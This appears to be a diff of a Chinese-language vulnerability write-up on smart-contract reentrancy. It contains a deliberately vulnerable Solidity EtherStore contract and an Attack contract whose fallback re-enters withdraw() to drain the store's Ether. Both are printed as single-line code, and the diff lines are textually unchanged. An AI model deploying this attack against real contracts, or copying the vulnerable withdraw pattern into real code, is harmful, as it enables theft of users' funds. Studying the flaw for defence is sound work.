@@ -54,7 +54,7 @@ source: "MrWQ/vulnerability-paper"
 ##### 存在漏洞合约
 
 ```
-// SPDX-License-Identifier: MITpragma solidity ^0.8.13;contract EtherStore {    mapping(address => uint) public balances;    function deposit() public payable {        balances[msg.sender] += msg.value;    }    function withdraw() public {        uint bal = balances[msg.sender];        require(bal > 0);        (bool sent, ) = msg.sender.call{value: bal}("");        require(sent, "Failed to send Ether");        balances[msg.sender] = 0;    }    // Helper function to check the balance of this contract    function getBalance() public view returns (uint) {        return address(this).balance;    \}\}
+// SPDX-License-Identifier: MITpragma solidity ^0.8.13;contract EtherStore {    mapping(address => uint) public balances;    function deposit() public payable {        balances[msg.sender] += msg.value;    }    function withdraw() public {        uint bal = balances[msg.sender];        require(bal > 0);        (bool sent, ) = msg.sender.call{value: bal}("");        require(sent, "Failed to send Ether");        balances[msg.sender] = 0;    }    // Helper function to check the balance of this contract    function getBalance() public view returns (uint) {        return address(this).balance;    \}\}
 ```
 
 这些代码看起来是一个正常的充值与提币的合约，但是`EtherStore`合约当中的`withdraw()函数`存在外部调用 **msg.sender.call{value: bal}**
@@ -64,7 +64,7 @@ source: "MrWQ/vulnerability-paper"
 ##### 攻击合约
 
 ```
-contract Attack {    EtherStore public etherStore;    constructor(address _etherStoreAddress) {        etherStore = EtherStore(_etherStoreAddress);    }        fallback() external payable {        if (address(etherStore).balance >= 1 ether) {            etherStore.withdraw();        }    }    function attack() external payable {        require(msg.value >= 1 ether);        etherStore.deposit{value: 1 ether}();        etherStore.withdraw();    }    function getBalance() public view returns (uint) {        return address(this).balance;    \}\}
+contract Attack {    EtherStore public etherStore;    constructor(address _etherStoreAddress) {        etherStore = EtherStore(_etherStoreAddress);    }        fallback() external payable {        if (address(etherStore).balance >= 1 ether) {            etherStore.withdraw();        }    }    function attack() external payable {        require(msg.value >= 1 ether);        etherStore.deposit{value: 1 ether}();        etherStore.withdraw();    }    function getBalance() public view returns (uint) {        return address(this).balance;    \}\}
 ```
 
 攻击者可以使用攻击合约，清空存在重入漏洞的合约 (相当于将合约里的存款全部转移到自己的账户)
